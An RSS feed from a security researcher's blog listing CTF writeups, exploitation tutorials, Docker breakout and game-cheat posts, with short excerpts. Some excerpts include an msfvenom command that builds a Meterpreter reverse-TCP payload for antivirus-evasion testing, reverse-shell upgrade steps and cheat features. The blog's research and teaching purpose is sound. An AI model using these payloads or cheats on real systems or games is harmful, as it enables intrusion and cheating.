<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>BananaMafia</title>
    <link>https://bananamafia.dev/</link>
    <description>Recent content on BananaMafia</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Wed, 15 Jan 2020 00:00:00 +0000</lastBuildDate>
    
	<atom:link href="https://bananamafia.dev/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Automotive Security Research</title>
      <link>https://bananamafia.dev/project/autosec/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/project/autosec/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Bananabot: CS:GO Multihack</title>
      <link>https://bananamafia.dev/project/bananabot/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/project/bananabot/</guid>
      <description></description>
    </item>
    
    <item>
      <title>CANalyzat0r</title>
      <link>https://bananamafia.dev/project/canalyzat0r/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/project/canalyzat0r/</guid>
      <description>Please find CANalyzat0r here on GitHub :)</description>
    </item>
    
    <item>
      <title>Crypt0r</title>
      <link>https://bananamafia.dev/project/crypt0r/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/project/crypt0r/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Dockerfiles</title>
      <link>https://bananamafia.dev/project/dockerfiles/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/project/dockerfiles/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Dotfile-tools</title>
      <link>https://bananamafia.dev/project/dotfile-tools/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/project/dotfile-tools/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Dotfiles</title>
      <link>https://bananamafia.dev/project/dotfiles/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/project/dotfiles/</guid>
      <description></description>
    </item>
    
    <item>
      <title>haxxor-tools</title>
      <link>https://bananamafia.dev/project/haxxor-tools/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/project/haxxor-tools/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Linux Containers Research</title>
      <link>https://bananamafia.dev/project/containers/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/project/containers/</guid>
      <description></description>
    </item>
    
    <item>
      <title>mitm-fuzz0r</title>
      <link>https://bananamafia.dev/project/mitmfuzz0r/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/project/mitmfuzz0r/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Official Cutter Docker Configuration</title>
      <link>https://bananamafia.dev/project/cutter-docker/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/project/cutter-docker/</guid>
      <description></description>
    </item>
    
    <item>
      <title>pwntools-r2</title>
      <link>https://bananamafia.dev/project/pwntools-r2/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/project/pwntools-r2/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Q3 Engine Multihack</title>
      <link>https://bananamafia.dev/project/jka-multihack/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/project/jka-multihack/</guid>
      <description></description>
    </item>
    
    <item>
      <title>RandomJK</title>
      <link>https://bananamafia.dev/project/randomjk/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/project/randomjk/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Exploiting A Use-After-Free With radare2 - CTF Challenge</title>
      <link>https://bananamafia.dev/post/uaf-1/</link>
      <pubDate>Wed, 15 Jan 2020 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/post/uaf-1/</guid>
      <description>This writeup is about a 36C3 junior CTF challenge called minifd which can be found here. The goal is to find and exploit a user-after-free vulnerability in order to spawn a shell on the remote system. Here&#39;s the challenge description:
This is a simple file manager implementation supporting basic functionality to create, read, and write files.
Please note: This is a prototype implementation. At this point of time, only 16 files can be managed at the same time.</description>
    </item>
    
    <item>
      <title>36C3 CTF Writeups</title>
      <link>https://bananamafia.dev/post/36c3ctf/</link>
      <pubDate>Mon, 30 Dec 2019 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/post/36c3ctf/</guid>
      <description>1337 skills Task description:
It’s too hard to gain all 1337 h4x0r skills required by nowadays CTFs ._.! I am glad a friendly hacker told me about an App he got during a (growth) hacking course. Sadly, he didn’t wrote down any activations codes.
Ready for your hacking exam?
 As can be read above, an Android app was given at the beginning of the challenge, with the hint to get a valid activation code for it.</description>
    </item>
    
    <item>
      <title>Open Redirects In State Parameters</title>
      <link>https://bananamafia.dev/post/openredirect/</link>
      <pubDate>Tue, 17 Dec 2019 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/post/openredirect/</guid>
      <description>Now that the deadline to fix this vulnerability has passed, I&#39;ve decided to publish this blog post that covers a web vulnerability I&#39;ve found in the login mechanism of a particular company.
Everything started when I had a look at a more complex part of a public web application of this vendor. The web application that gives out a link to the user that can be used to open up the same user state again at a later point.</description>
    </item>
    
    <item>
      <title>ROP on ARM with radare2</title>
      <link>https://bananamafia.dev/post/rop-arm-1/</link>
      <pubDate>Tue, 19 Nov 2019 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/post/rop-arm-1/</guid>
      <description>Exploit development on ARM with radare2 seems like a great idea until you start searching for resources, searching for a nice and automated debugging setup. Here&#39;s what I&#39;ve found:
nothing
Cool. That&#39;s the reason why this post covers the setup I came up with, as well as basics for ROP on the ARM architecture. The exploit target is stack6 from Azeria Labs and radare2 will be used as a debugger. If you&#39;re a beginner I suggest reading the ARM assembly basics on the same site first before starting the challenges from the beginning with stack0.</description>
    </item>
    
    <item>
      <title>In-Process Fuzzing With Frida</title>
      <link>https://bananamafia.dev/post/frida-fuzz/</link>
      <pubDate>Thu, 24 Oct 2019 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/post/frida-fuzz/</guid>
      <description>In a previous post I&#39;ve already covered Frida and its instrumentation abilities. But check this out: You can also use Frida to perform fuzzing. What&#39;s even greater is that Frida allows in-process fuzzing.
Why would you want to do this? There may be various reasons, but the most outstanding one for me is building a fuzzing harness for closed source applications and libraries. Just take Counter Strike GO as an example:</description>
    </item>
    
    <item>
      <title>How I Over-Engineered My Dotfiles</title>
      <link>https://bananamafia.dev/post/dotfiles/</link>
      <pubDate>Wed, 16 Oct 2019 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/post/dotfiles/</guid>
      <description>You want to customize your Linux dotfiles, whether you already know it or not. After investing way too much time into this, I&#39;ve decided to share some results and tricks in this blog post.
General Structure The first thing to do is to create a general structure for your dotfiles and all associated files and scripts. I came up with this structure:
dotfiles ├── aliases ├── bashrc ├── bindings: Additional key bindings ├── exports: Shell-wide exports ├── i3: Config and bar for i3 window manager │ ├── config │ ├── polybar │ └── scripts ├── Makefile: Generate readme and call shellcheck on push [.</description>
    </item>
    
    <item>
      <title>How Not To Suck At r2wars</title>
      <link>https://bananamafia.dev/post/r2wars-2019/</link>
      <pubDate>Tue, 01 Oct 2019 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/post/r2wars-2019/</guid>
      <description>As every year at r2con, the r2wars competition was hosted by sanguinawer and the r2 overlord pancake. I&#39;ve made it to the second place in this year&#39;s battles, so I&#39;ve promised to create a writeup for my participation &amp;ndash; and here it is. Welcome to the nerdiest game in town.
Lol What&#39;s r2wars Again? The r2wars competition is based on radare2&#39;s ESIL (Evaluable Strings Intermediate Language) engine. It&#39;s normally used to emulate instructions of various architectures during reverse engineering.</description>
    </item>
    
    <item>
      <title>Dynamic Instrumentation: Frida And r2frida For Noobs</title>
      <link>https://bananamafia.dev/post/r2frida-1/</link>
      <pubDate>Fri, 13 Sep 2019 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/post/r2frida-1/</guid>
      <description>One of my main takeaways from this year&#39;s r2con is that Frida is cool and that r2frida, the integration with radare2, is even cooler. Using this, it&#39;s possible to pair the benefits of dynamic instrumentation of Frida with the analysis features and workflow of radare2. This is a small tutorial to get started with both Frida and r2frida that&#39;s based on the r2xor challenge of the recent r2con CTF. Please note that this is not a complete writeup for r2xor.</description>
    </item>
    
    <item>
      <title>r2con 2019 CTF Writeups</title>
      <link>https://bananamafia.dev/post/r2ctf-2019/</link>
      <pubDate>Mon, 02 Sep 2019 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/post/r2ctf-2019/</guid>
      <description>r2boy1 The first GameBoy challenge was rather easy. The idea was to talk to the Pancake character in-game in order to get the flag. The problem is that Pancake chills behind a wall. One possible solution was to glitch through the wall, however I&#39;ve solved this using static analysis.
Going through the strings and searching for a possible dialog yields interesting strings:
[0x00054075]&amp;gt; izzq~pancake 0x54016 37 36 Find pancake\nthrough a game\nglitch!</description>
    </item>
    
    <item>
      <title>ROP On x64: What&#39;s ret2csu Again?</title>
      <link>https://bananamafia.dev/post/x64-rop-redpwn/</link>
      <pubDate>Thu, 29 Aug 2019 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/post/x64-rop-redpwn/</guid>
      <description>Based on the Stop, ROP, n&amp;rsquo;, Roll challenge from this year&#39;s Redpwn CTF, this post will explain how to make system calls on x64 using ROP in order to spawn a shell. Also, it shows how to abuse writable memory regions of a process to overcome difficulties with some ROP gadgets. And the best thing is, two of the gadgets used in this writeup are universal and most likely also present in your x64 target if it&#39;s using glibc.</description>
    </item>
    
    <item>
      <title>Reversing .NET Applications: CCCamp19 CTF CampRE Challenge</title>
      <link>https://bananamafia.dev/post/dotnet-re-cccamp19/</link>
      <pubDate>Sun, 25 Aug 2019 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/post/dotnet-re-cccamp19/</guid>
      <description>Finally a nice .NET CTF challenge - time to pull out dnSpy :)
The provided ZIP includes a CampRE.dll file which, according to the challenge description, is a .NET Core application. Time to boot a Windows VM and install the .NET Core runtime environment.
After decompiling the dll, this source code can be inspected:
private static void Main(string[] args) { byte[] sourceArray = File.ReadAllBytes(Assembly.GetAssembly(typeof(Program)).Location); for (int i = 0; i &amp;lt; 1333337; i++) { MD5 md = MD5.</description>
    </item>
    
    <item>
      <title>Exploiting PHP Deserialization: CCCamp19 CTF PDFCreator Challenge</title>
      <link>https://bananamafia.dev/post/php-deserialize-cccamp19/</link>
      <pubDate>Sat, 24 Aug 2019 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/post/php-deserialize-cccamp19/</guid>
      <description>Deserialization is a vulnerability class that&#39;s often overlooked. It&#39;s great that this year&#39;s CCCamp CTF included an interesting web based challenge that is based on this vulnerability class.
The Target The challenge includes a link to a web service that allows converting user-supplied images into PDF files. Users can upload image files, add some additional HTML content in a textbox and render the whole thing into a PDF file:
A ZIP file with the source code of the web application is also available.</description>
    </item>
    
    <item>
      <title>ROP It Like It&#39;s Hot: ROP Basics - Stack Pivoting</title>
      <link>https://bananamafia.dev/post/binary-rop-stackpivot/</link>
      <pubDate>Tue, 13 Aug 2019 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/post/binary-rop-stackpivot/</guid>
      <description>Let&#39;s check out Return Oriented Programming (ROP) with the pivot32 challenge from ROP Emporium by using radare2. The pivot32 binary is compiled without stack canaries and PIE but has NX enabled.
Basics The general principle behind ROP is that:
[&amp;hellip;] an attacker gains control of the call stack to hijack program control flow and then executes carefully chosen machine instruction sequences that are already present in the machine&#39;s memory, called &amp;ldquo;gadgets&amp;rdquo;.</description>
    </item>
    
    <item>
      <title>CryptoCTF 2019 Writeup: Decode Me</title>
      <link>https://bananamafia.dev/post/cryptoctf-1-decodeme/</link>
      <pubDate>Sun, 11 Aug 2019 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/post/cryptoctf-1-decodeme/</guid>
      <description>This is short writeup on the Decode Me challenge of the first CryptoCTF.
The following string has to be decoded into a flag somehow:
D: mb xwhvxw mlnX 4X6AhPLAR4eupSRJ6FLt8AgE6JsLdBRxq57L8IeMyBRHp6IGsmgFIB5E :ztey xam lb lbaH The first thing that comes to mind is that some sort of substitution cipher was being used in the first place. A cipher of this kind is the Caesar cipher which is also known as ROT. Fiddling around with this cipher and a key of 7 yields:</description>
    </item>
    
    <item>
      <title>Brute-Forcing x86 Stack Canaries</title>
      <link>https://bananamafia.dev/post/binary-canary-bruteforce/</link>
      <pubDate>Thu, 08 Aug 2019 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/post/binary-canary-bruteforce/</guid>
      <description>And now for something more CTF-y: Dealing with stack canaries by brute-forcing their value byte by byte.
How Stack Canaries Work If you&#39;ve ever read the error message *** stack smashing detected ***: &amp;lt;...&amp;gt; terminated, you&#39;ve already encountered stack canaries in action. They are being used to detect and stop buffer overflows by placing a per-process randomized value between the local variables and the saved return address. If an attacker somehow manages to write across the boundary of a buffer in order to overwrite the saved return address, he will also overwrite the canary.</description>
    </item>
    
    <item>
      <title>r2con 2019 PwnDebian Challenge: Exploiting radare2 (CVE-2019-14745, CVE-2019-16718)</title>
      <link>https://bananamafia.dev/post/r2-pwndebian/</link>
      <pubDate>Tue, 30 Jul 2019 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/post/r2-pwndebian/</guid>
      <description>Hello hello!
Everyone knows: This years r2con, the conference about radare2, has a very special challenge &amp;ndash; PwnDebian:
The almighty blenk92 and me decided to assist the radare2 project in finding such an exploit an we think we were quite successful :)
But first some basics for r2.
Shelling Out Via The r2 Shell While running r2, it&#39;s possible to shell out and execute shell commands without leaving the r2 console:</description>
    </item>
    
    <item>
      <title>Buffer Overflows on x64 with radare2</title>
      <link>https://bananamafia.dev/post/x64-bof/</link>
      <pubDate>Sat, 13 Jul 2019 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/post/x64-bof/</guid>
      <description>The approach to exploit buffer overflows on x64 is a bit different that on x86. This post demonstrates this using the split challenge of ROP Emporium while making use of radare2.
RIP &amp;amp; Canonical Addresses The first thing one notices when trying to gain control over the instruction pointer is that only values of a specific range are allowed to be loaded into the RIP register. On x86 arbitrary values can be loaded into the instruction pointer register (EIP) - on x64 only canonical values are allowed.</description>
    </item>
    
    <item>
      <title>Coding A CS:GO Hack</title>
      <link>https://bananamafia.dev/post/bananabot/</link>
      <pubDate>Wed, 19 Jun 2019 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/post/bananabot/</guid>
      <description>This post covers creating a multihack for the game Counter Strike: Global Offensive. The created hack works with the Linux version of the game - coding a windows-based hack can however be done with the same methodology and tools. Below you can find a demonstration of the finished cheat:
The features therefore include:
 Bunnyhop Bot: Do jumps as soon as the player hits the ground to make it easier to perform bunny hop chains No Flash: Be immune to flash grenades that would block the players vision Aimbot: Automatically aim at the head of the nearest enemy  Tooling &amp;amp; Setup Linux lacks of good tools to perform the kind of analysis tasks required to code a cheat like this.</description>
    </item>
    
    <item>
      <title>Bypassing ASLR and DEP for 32-Bit Binaries With r2</title>
      <link>https://bananamafia.dev/post/binary-aslr-dep-32/</link>
      <pubDate>Wed, 01 May 2019 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/post/binary-aslr-dep-32/</guid>
      <description>This post covers basic basics of bypassing ASLR and DEP with r2. For this, a vulnerable application, yolo.c, is required:
#include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;string.h&amp;gt; void lol(char *b) { char buffer[1337]; strcpy(buffer, b); } int main(int argc, char **argv) { lol(argv[1]); } 64-Bit vs 32-Bit Binaries The issue here should be quite obvious - strcpy blindly copies the user-controlled input buffer b into buffer which causes a buffer overflow. Since normally ASLR and DEP are enabled, the following things don&#39;t just work out of the box:</description>
    </item>
    
    <item>
      <title>Information Leak in Docker</title>
      <link>https://bananamafia.dev/post/docker-leak/</link>
      <pubDate>Fri, 04 Jan 2019 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/post/docker-leak/</guid>
      <description>During an assessment of the Docker platform in November 2018, two information leaks regarding the /proc/asound path were discovered in the OCI (Open Container Initiative) specification. These issues have been fixed quickly by the Docker security team using the provided suggestions.
Leak of audio device status of the host When media is being played on the host, the /proc/asound/card*/pcm*p/sub*/status files may contain information regarding the status of media playback. Consider this command for a demonstration:</description>
    </item>
    
    <item>
      <title>Random Note #092345: Passing binary input via GDB</title>
      <link>https://bananamafia.dev/post/rnd-092345-gdb/</link>
      <pubDate>Fri, 26 Oct 2018 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/post/rnd-092345-gdb/</guid>
      <description>When trying to exploit an application it&#39;s useful to send the input via gdb to immediately check how the input is being processed. But once the gdb is open it&#39;s sometimes not clear how to pass binary input to applications reading from stdin, e.g. using read. An easy way is to start the debugging session with gdb ./binary and using
run &amp;lt; &amp;lt;(printf &amp;quot;\xAA\xAA\xAA&amp;quot;) from the gdb session to send arbitrary bytes.</description>
    </item>
    
    <item>
      <title>Car Hacking: A Short Overview</title>
      <link>https://bananamafia.dev/post/autohax/</link>
      <pubDate>Tue, 23 Oct 2018 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/post/autohax/</guid>
      <description>Ever wondered about the various techniques that can be applied to hack modern cars? This post documents various ways to do so - you can use it as a cheatsheet
Software There are multiple ways one can interface with the software stack of a car. The easiest one is to use USB-to-Ethernet adapters in order to attach to the network of the car. It&#39;s important to use special adapters that are whitelisted on the car&#39;s head unit.</description>
    </item>
    
    <item>
      <title>Creating A Multiplayer Game Hack</title>
      <link>https://bananamafia.dev/post/multihack/</link>
      <pubDate>Tue, 28 Aug 2018 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/post/multihack/</guid>
      <description>What? This post covers creating a multihack for multiplayer games. The target is a Quake3 based game called Jedi Academy. I&#39;ve found the techniques and process of doing this to be fairly undocumented and obscure, so this can serve as a starting point for researchers and game hackers.
I&#39;ve released my multihack source code. These are the implemented features:
 Wallhack (seeing enemies through walls) Player Glow (Enemies are glowing) Cheat Unlocker (Use otherwise blocked client side settings) Triggerbot (Automatically pull the trigger and shoot at enemies once they are in the crosshair)  This is what the wallhack and player glow looks like:</description>
    </item>
    
    <item>
      <title>Runtime Function Patching</title>
      <link>https://bananamafia.dev/post/cvar-hax/</link>
      <pubDate>Thu, 16 Aug 2018 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/post/cvar-hax/</guid>
      <description>When it comes to patching certain functions of a binary on ASM level, it&#39;s often performed by modifying the binary itself. This post shows a different approach to accomplish the same thing: Removing game cheat protections using runtime function patching.
The Target This is being shown in the following context: Quake3 based multiplayer games include certain settings (CVars) which are disabled for players to prevent cheating. These settings would enable clients to disable fog and shadows and use different camera angles.</description>
    </item>
    
    <item>
      <title>Random Note #632424: Backup Google Authenticator Data</title>
      <link>https://bananamafia.dev/post/rnd-632424-2fa-backup/</link>
      <pubDate>Wed, 20 Jun 2018 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/post/rnd-632424-2fa-backup/</guid>
      <description>Using 2 factor authentication generally is a good idea. However, losing 2 factor data can be the opposite. If you&#39;re using Google Authenticator to generate 2FA codes, you may have wondered how to backup the data the app uses to generate codes. The method described here requires root access of course but doesn&#39;t require a third party app. Please note that you can always use apps that backup app data but recovering this data on newer Android versions can fail.</description>
    </item>
    
    <item>
      <title>Docker Breakout Using X11</title>
      <link>https://bananamafia.dev/post/docker-breakout/</link>
      <pubDate>Fri, 18 May 2018 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/post/docker-breakout/</guid>
      <description>Use Docker to run GUI applications they said.
Mount the X11 socket they said.
Allow other users to access your X session they said.
This post covers Docker container breakouts by abusing bad security practices related to the X11 socket.
The problem To display windows spawned through a Docker container, people often launch containers following these steps:
 Use -e DISPLAY=$DISPLAY to share the display variable value Specifying -v /tmp/.X11-unix:/tmp/.X11-unix:ro shares the X11 socket - optionally as read only.</description>
    </item>
    
    <item>
      <title>Methods to Upgrade nc Reverse Shells</title>
      <link>https://bananamafia.dev/post/shell-upgrade/</link>
      <pubDate>Wed, 16 May 2018 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/post/shell-upgrade/</guid>
      <description>Ended up with a cheap nc shell and want to upgrade to a &amp;ldquo;real&amp;rdquo; shell with a proper TTY and navigation?
Say no more &amp;lt;:
1. Upgrading using shell magic This doesn&#39;t always work - however if Python is present on the victims machine, it&#39;s worth a try.
 Use bash on the attacker machine, zsh doesn&#39;t seem to work. Get the nc shell. In the shell, execute python -c &#39;import pty; pty.</description>
    </item>
    
    <item>
      <title>2 Common Python Security Issues</title>
      <link>https://bananamafia.dev/post/python-hax/</link>
      <pubDate>Sun, 13 May 2018 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/post/python-hax/</guid>
      <description>tl;dr Be aware that imports can be hijacked for Python2 and Python3 - take care of EUIDs.
Don&#39;t use input() for Python2.x.
Module Hijacking When assigning SUID bits to Python scripts, privileges can be escalated easily. Consider the following Python source code:
#!/usr/bin/python2.7 # -*- coding: utf-8 -*- import hashlib value = raw_input() md5 = hashlib.md5() md5.update(value) print md5.digest() Note that in case of SUID binaries this code runs as root.</description>
    </item>
    
    <item>
      <title>Cracking Music Server Software</title>
      <link>https://bananamafia.dev/post/mserver-crack/</link>
      <pubDate>Sun, 13 May 2018 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/post/mserver-crack/</guid>
      <description>tl;dr Generating licenses using MD5(email) is bad.
Validating licenses using HTTP in plain text is bad.
The Software This post covers reverse engineering and cracking the license validation process of a popular and closed source self hosted music server application. The developer has been notified about the findings, however no reply has been received. The validation issues still exist as of now and affects all issued licenses. Because of this, the name of the application won&#39;t be disclosed.</description>
    </item>
    
    <item>
      <title>Random Note #12354123: Easy Remote Pair Programming Using Docker and Tmux</title>
      <link>https://bananamafia.dev/post/pairprog/</link>
      <pubDate>Tue, 10 Apr 2018 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/post/pairprog/</guid>
      <description>Recently I&#39;ve created a small docker container to perform remote pair programming. Shared shell sessions are an easy way to remotely interact with coworkers or other people. With additional docker magic you now don&#39;t even have to give them access to your host system - they will be contained just like you and the work that&#39;s being done. Using my docker image, it&#39;s possible to share a tmux session with a group of people.</description>
    </item>
    
    <item>
      <title>Random Note #23542351: Using the GitHub API to improve Dockerfiles</title>
      <link>https://bananamafia.dev/post/rnd-23542352/</link>
      <pubDate>Tue, 20 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/post/rnd-23542352/</guid>
      <description>When writing Dockerfiles, people often use something like this to download and install software from GitHub:
ENV SOFTWARE_VERSION 1.33.7 RUN curl -sSL \ https://github.com/user/repo/releases/download/${SOFTWARE_VERSION}/amd64.deb This can be optimized so that always the newest version gets used, which also simplifies maintaining the Dockerfile because updating happens automatically:
curl -sSL \ $(curl -sSL https://api.github.com/repos/user/repo/releases/latest | \ grep &amp;quot;browser_download_url&amp;quot; | \ grep &amp;quot;amd64.deb&amp;quot; | \ cut -d &amp;quot;:&amp;quot; -f 2,3 | \ tr --delete \&amp;quot; | \ tr --delete &amp;quot; &amp;quot;) \ -o /tmp/software-amd64.</description>
    </item>
    
    <item>
      <title>A Quick Survey on Anti-Anti-Viruses</title>
      <link>https://bananamafia.dev/post/crypt0r/</link>
      <pubDate>Fri, 16 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/post/crypt0r/</guid>
      <description>tl;dr AVs can easily be bypassed using malware AES crypters like Crypt0r:
Open Source Evasion Techniques All of the following results are based on a meterpreter file which was generated like this:
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -f exe LHOST=192.168.1.1 LPORT=1337 -o meter.exe All scans are performed on VirusTotal. Please not that this covers static analysis only. However, it will become clear later on that dynamic analysis of the used techniques aren&#39;t required at all.</description>
    </item>
    
    <item>
      <title>Monitor All the Things using Docker and Monit</title>
      <link>https://bananamafia.dev/post/monit/</link>
      <pubDate>Fri, 16 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/post/monit/</guid>
      <description>After setting up 329423 services and 823423 containers, you might want to manage your environment in case some service fails. This can be automated restarting, getting notified about failures or a similar thing. Say no more, I&#39;ve created a Dockerfile and image for Monit for this.
Monit is extremely configurable and allows a maximum of flexibility when it comes to monitoring.
Initially, a configuration file is required to get started. To get one, call</description>
    </item>
    
    <item>
      <title>Exploiting Unqoted Service Paths For Fun and No Profit</title>
      <link>https://bananamafia.dev/post/realtek-driverutil/</link>
      <pubDate>Thu, 15 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/post/realtek-driverutil/</guid>
      <description>This kind of vulnerability is really old. However, vendors still fail to properly address this issue. This is just another example of exploiting this kind of vulnerability on Windows 10 with the most up-to-date ALFA AWUS036AC driver utility (version 1030.6). Note that the download link points to alfa.com but the driver utility itself says it&#39;s developed by REALTEK.
The vulnerability Upon installing the driver utility, two vulnerable services get installed. This can be checked using the following command:</description>
    </item>
    
    <item>
      <title>Easy and Secure Backups Using Borg and Docker</title>
      <link>https://bananamafia.dev/post/docker-borg/</link>
      <pubDate>Wed, 14 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/post/docker-borg/</guid>
      <description>BorgBackup is a secure backup solution which is also easy to use. It provides compression, encryption, deduplication and authentication.
Getting started I&#39;ve created a Dockerfile based on Alpine Linux which is also available on DockerHub. It gets built weekly to always stay up to date.
This Makefile can be used to quickly get started using a containerized version of Borg:
SHELL := /bin/bash VERSION ?= latest # The directory of this file DIR := $(shell echo $(shell cd &amp;quot;$(shell dirname &amp;quot;${BASH_SOURCE[0]}&amp;quot; )&amp;quot; &amp;amp;&amp;amp; pwd )) IMAGE_NAME ?</description>
    </item>
    
    <item>
      <title>Automated and Tested Dotfile Deployment Using Ansible and Docker</title>
      <link>https://bananamafia.dev/post/dotfile-deployment/</link>
      <pubDate>Thu, 08 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/post/dotfile-deployment/</guid>
      <description>This is the second part of my posts about Dotfile management. Part one can be found here.
After spending a lot of time and effort on your Dotfiles, it may be useful to setup an automated deployment process. There are existing solutions like GNU Stow, but for maximum flexibility the use of Ansible may be a better option. Using this, files and advanced configuration hierarchies can be distributed easily. This post covers my personal setup, which also includes an automated deployment test approach for multiple linux distributions.</description>
    </item>
    
    <item>
      <title>Using Shellcheck and Docker to Automatically Lint Dotfiles</title>
      <link>https://bananamafia.dev/post/dotfile-shellcheck/</link>
      <pubDate>Thu, 08 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/post/dotfile-shellcheck/</guid>
      <description>In order to prevent errors and side effects, it&#39;s useful to use Shellcheck to lint all shell scripts. While checking out the Dotfiles of jessfraz, I came across an easy way to integrate this kind of check with Travis CI. The mentioned approach triggers a travis linting process after pushing to to the Dotfiles repository on GitHub. This post will explain all necessary steps to integrate this process into your own repository.</description>
    </item>
    
    <item>
      <title>Universal Notifications Using Telegram and cURL</title>
      <link>https://bananamafia.dev/post/telegram-notifications/</link>
      <pubDate>Wed, 07 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/post/telegram-notifications/</guid>
      <description>If you ever wanted to get notified when certain things happen but didn&#39;t find a lightweight solution &amp;ndash; here comes captain Telegram.
Using a simple Telegram bot, it&#39;s possible to send notifications to your mobile phone or browser. All the notifier node needs is curl installed.
Registering a bot First of all, a Telegram bot has to be registered in order to send messages later on. Follow these steps to get started:</description>
    </item>
    
    <item>
      <title>Building a CI Docker Pipeline Using Docker in Your Docker</title>
      <link>https://bananamafia.dev/post/docker-jenkins/</link>
      <pubDate>Mon, 15 Jan 2018 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/post/docker-jenkins/</guid>
      <description>Note: This isn&#39;t up to date anymore, instead use img .
First of all – why should you want to build all the docker images on your own build server?
 Complete control over the build process You know when the images are built and how up-to-date they are Use of private repositories and images Because you can  This assumes that you already have control over a private docker registry.</description>
    </item>
    
    <item>
      <title>Auditing WriteDiary.com</title>
      <link>https://bananamafia.dev/post/write-diary/</link>
      <pubDate>Fri, 27 Oct 2017 00:00:00 +0000</pubDate>
      
      <guid>https://bananamafia.dev/post/write-diary/</guid>
      <description>WriteDiary consists of a webapp and an Android app (version 4.72). For the audit, the android app was the primary target.
The developer and owner of both the webapp and android app has been contacted multiple times to develop a quick fix for the issues addressed in this blog post and a vulnerability concerning the webapp which isn&#39;t described here. However, no response has been received. This is bad, as you will see in the first finding:</description>
    </item>
    
  </channel>
</rss>